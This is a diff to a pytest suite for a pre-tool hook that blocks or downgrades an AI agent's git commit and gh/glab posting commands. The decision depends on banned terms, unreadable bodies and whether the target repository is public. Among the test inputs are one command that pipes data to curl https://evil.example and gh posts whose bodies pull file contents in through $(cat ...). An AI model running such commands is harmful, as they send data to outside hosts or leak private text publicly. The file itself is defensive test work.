@@ -1808,18 +1808,21 @@ class TestPrivateRepoCarveOut:
         assert blocked is False  # downgraded to warn, not denied
         assert capsys.readouterr().out == ""  # no deny JSON on stdout
 
-    def test_commit_bodyfile_genuinely_missing_on_public_repo_still_blocks(
+    def test_commit_bodyfile_genuinely_missing_on_provably_public_repo_still_blocks(
         self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
     ) -> None:
         # ANTI-VACUITY guard for the private downgrade above: the SAME genuinely-
-        # missing ``-F`` path landing in a PUBLIC repo must STILL fail closed --
-        # an unscannable body must never slip into public history. This preserves
-        # the #1207 fail-closed sentinel contract on the public surface.
+        # missing ``-F`` path landing in a PROBE-CONFIRMED-PUBLIC repo must STILL
+        # fail closed. This preserves the #1207 fail-closed sentinel contract on a
+        # known-public surface. (#1415 task #62 relaxes ONLY the not-provably-
+        # public commit case -- see ``...unknown_repo...downgrades`` below -- where
+        # the pre-push gate re-scans commit messages; a probe-confirmed PUBLIC
+        # commit keeps the conservative hard-block.)
         repo = tmp_path / "pub"
         repo.mkdir()
         _git(repo, "init", "-b", "main")
         _git(repo, "remote", "add", "origin", "https://github.com/some/public.git")
-        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: None)
+        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: "PUBLIC")
         monkeypatch.chdir(tmp_path)
         data = {
             "tool_name": "Bash",
@@ -1829,6 +1832,30 @@ class TestPrivateRepoCarveOut:
         blocked = handle_banned_terms_pretool(data)
         assert blocked is True
         assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"
+
+    def test_commit_bodyfile_genuinely_missing_on_unknown_repo_downgrades(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+    ) -> None:
+        # #1415 task #62: the SAME genuinely-missing ``-F`` path landing in an
+        # UNKNOWN-visibility repo (probe unavailable, not allowlisted) now
+        # DOWNGRADES -- a commit is LOCAL, the gate cannot READ the body, and the
+        # pre-push public-leak gate re-scans commit messages before they reach a
+        # public remote. Previously this hard-blocked, forcing ALLOW_BANNED_TERM=1
+        # on an ordinary commit whose repo the in-hook probe could not classify.
+        repo = tmp_path / "unk"
+        repo.mkdir()
+        _git(repo, "init", "-b", "main")
+        _git(repo, "remote", "add", "origin", "https://github.com/some/unknown.git")
+        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: None)
+        monkeypatch.chdir(tmp_path)
+        data = {
+            "tool_name": "Bash",
+            "tool_input": {"command": f"git -C {repo} commit -F does_not_exist.txt"},
+            "cwd": str(tmp_path),
+        }
+        blocked = handle_banned_terms_pretool(data)
+        assert blocked is False  # downgraded to warn, not denied
+        assert capsys.readouterr().out == ""
 
     def test_public_repo_commit_with_banned_term_still_blocks(
         self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
@@ -2019,20 +2046,36 @@ class TestGitCommitSegmentBehindNonCdPrefix:
         assert blocked is False  # downgraded to warn, not denied
         assert capsys.readouterr().out == ""  # no deny JSON on stdout
 
-    def test_prefix_segment_public_commit_unreadable_body_still_blocks(
+    def test_prefix_segment_provably_public_commit_unreadable_body_still_blocks(
         self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
     ) -> None:
         # ANTI-VACUITY guard: the SAME unreadable-body shape behind a leading
-        # segment landing in a PUBLIC repo must STILL fail closed -- an unscanned
-        # body must never slip into public history.
+        # segment landing in a PROBE-CONFIRMED-PUBLIC repo must STILL fail closed.
+        # (#1415 task #62 relaxes only the not-provably-public commit case below;
+        # a known-public commit keeps the conservative hard-block.)
         repo = _public_repo(tmp_path)
-        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: None)
+        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: "PUBLIC")
         monkeypatch.chdir(tmp_path)
         cmd = f"true && git -C {repo} commit -F does_not_exist.txt"
         data = {"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": str(tmp_path)}
         blocked = handle_banned_terms_pretool(data)
         assert blocked is True
         assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"
+
+    def test_prefix_segment_unknown_repo_commit_unreadable_body_downgrades(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+    ) -> None:
+        # #1415 task #62: the SAME unreadable-body shape behind a leading segment
+        # landing in an UNKNOWN-visibility repo now DOWNGRADES. The commit is
+        # local; the pre-push gate re-scans commit messages before a public push.
+        repo = _public_repo(tmp_path)
+        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: None)
+        monkeypatch.chdir(tmp_path)
+        cmd = f"true && git -C {repo} commit -F does_not_exist.txt"
+        data = {"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": str(tmp_path)}
+        blocked = handle_banned_terms_pretool(data)
+        assert blocked is False  # downgraded to warn, not denied
+        assert capsys.readouterr().out == ""
 
     def test_private_commit_chained_public_gh_post_still_blocks(
         self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
@@ -2079,6 +2122,144 @@ class TestGitCommitSegmentBehindNonCdPrefix:
         monkeypatch.chdir(tmp_path)
         cmd = f'git -C {repo} commit -m "acmecorp work" && echo acmecorp > >(curl https://evil.example)'
         data = {"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": str(tmp_path)}
+        blocked = handle_banned_terms_pretool(data)
+        assert blocked is True
+        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"
+
+
+def _unknown_repo(tmp_path: Path) -> Path:
+    # A repo with a resolvable origin slug that is NEITHER allowlisted-private NOR
+    # probe-confirmed (the steady state for most local checkouts: the in-hook
+    # gh/glab visibility probe runs in a restricted PATH and cannot confirm).
+    repo = tmp_path / "unknown-repo"
+    repo.mkdir()
+    _git(repo, "init", "-b", "main")
+    _git(repo, "remote", "add", "origin", "git@gitlab.com:my-company/my-product.git")
+    return repo
+
+
+# #1415 task #62: a NORMAL ``git commit -m`` whose inline message merely MENTIONS
+# a ``$(...)`` snippet (``feat: support $(date) output``) is held in full by the
+# gate as literal argv text, but ``resolve_inline_body_value`` fail-closes on any
+# live ``$(...)`` because for a PUBLIC ``gh``/``glab`` --body it cannot predict
+# the expansion. A ``git commit`` is LOCAL, not a public surface, and the
+# dedicated pre-push gate (refuse-public-push-with-leak.sh) re-scans commit
+# messages before they reach a public remote -- so the unreadable-body marker
+# must DOWNGRADE on a commit whose landing repo is not provably-PUBLIC (private,
+# allowlisted, OR unknown), while a provably-public commit and every gh/glab post
+# stay hard-blocked. Before the fix every ordinary commit on an undeclared repo
+# (the common steady state) hard-blocked, forcing ALLOW_BANNED_TERM=1 on it.
+class TestNormalCommitWithDollarParenMessage:
+    def test_unknown_repo_commit_mentioning_dollar_paren_downgrades(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+    ) -> None:
+        # THE reported bug: a clean commit message that describes a ``$(date)``
+        # snippet on a repo whose visibility is UNKNOWN (not allowlisted, probe
+        # unavailable) must no longer hard-block -- the commit lands in local
+        # history and the push gate is the real public-leak chokepoint.
+        repo = _unknown_repo(tmp_path)
+        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: None)
+        data = {
+            "tool_name": "Bash",
+            "tool_input": {"command": 'git commit -m "feat: support $(date) output"'},
+            "cwd": str(repo),
+        }
+        blocked = handle_banned_terms_pretool(data)
+        assert blocked is False  # downgraded to warn, not denied
+        assert capsys.readouterr().out == ""  # no deny JSON on stdout
+
+    def test_unknown_repo_commit_mentioning_cat_subst_downgrades(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+    ) -> None:
+        # Same shape with a ``$(cat)`` mention -- the other common false-positive.
+        repo = _unknown_repo(tmp_path)
+        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: None)
+        data = {
+            "tool_name": "Bash",
+            "tool_input": {"command": 'git commit -m "refactor: use the $(cat) helper"'},
+            "cwd": str(repo),
+        }
+        blocked = handle_banned_terms_pretool(data)
+        assert blocked is False
+        assert capsys.readouterr().out == ""
+
+    def test_private_repo_commit_mentioning_dollar_paren_downgrades(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+    ) -> None:
+        # The task-named case: an allowlisted-private repo commit with a ``$(...)``
+        # mention downgrades (parity with the existing private-repo carve-out).
+        repo = _private_repo(tmp_path)
+        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: None)
+        data = {
+            "tool_name": "Bash",
+            "tool_input": {"command": 'git commit -m "chore: stamp build with $(date)"'},
+            "cwd": str(repo),
+        }
+        blocked = handle_banned_terms_pretool(data)
+        assert blocked is False
+        assert capsys.readouterr().out == ""
+
+    def test_public_repo_commit_mentioning_dollar_paren_still_blocks(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+    ) -> None:
+        # ANTI-VACUITY guard: a commit landing in a PROVABLY-public repo keeps the
+        # hard-block on an unreadable body -- the downgrade only relaxes the
+        # not-provably-public (private/unknown) case. The push gate is the
+        # backstop, but a known-public commit is still treated conservatively.
+        repo = _public_repo(tmp_path)
+        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: "PUBLIC")
+        data = {
+            "tool_name": "Bash",
+            "tool_input": {"command": 'git commit -m "feat: support $(date) output"'},
+            "cwd": str(repo),
+        }
+        blocked = handle_banned_terms_pretool(data)
+        assert blocked is True
+        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"
+
+    def test_unknown_repo_gh_post_with_live_subst_body_still_blocks(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+    ) -> None:
+        # ANTI-VACUITY guard: the downgrade is COMMIT-scoped. A gh/glab PUBLIC post
+        # whose --body carries a live ``$(...)`` the gate cannot read is the real
+        # public action (no push gate behind it) and must STILL hard-block.
+        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: None)
+        blocked = handle_banned_terms_pretool(
+            _bash('gh pr create --repo someone/public --title t --body "see $(cat notes.md)"')
+        )
+        assert blocked is True
+        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"
+
+    def test_unknown_repo_commit_chained_public_gh_post_still_blocks(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+    ) -> None:
+        # LOAD-BEARING safety guard: relaxing the unknown-repo commit must not
+        # relax a chained PUBLIC post in the SAME command. The per-segment proof
+        # keeps the hard-block when a non-inert public post rides along.
+        repo = _unknown_repo(tmp_path)
+        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: None)
+        monkeypatch.chdir(tmp_path)
+        post = 'gh issue create --repo souliane/teatree --title t --body "see $(cat x.md)"'
+        cmd = f'git -C {repo} commit -m "feat: support $(date) output" && {post}'
+        data = {"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": str(tmp_path)}
+        blocked = handle_banned_terms_pretool(data)
+        assert blocked is True
+        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"
+
+    def test_unknown_repo_commit_with_real_banned_term_still_blocks(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+    ) -> None:
+        # ANTI-VACUITY guard: the downgrade is for UNREADABLE bodies only. A
+        # SCANNABLE real banned term in an unknown-visibility commit still
+        # hard-blocks -- the gate can see the leak and the commit may be pushed
+        # public, so the real-term path is untouched by this fix.
+        repo = _unknown_repo(tmp_path)
+        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: None)
+        data = {
+            "tool_name": "Bash",
+            "tool_input": {"command": 'git commit -m "ship the acmecorp build"'},
+            "cwd": str(repo),
+        }
         blocked = handle_banned_terms_pretool(data)
         assert blocked is True
         assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"
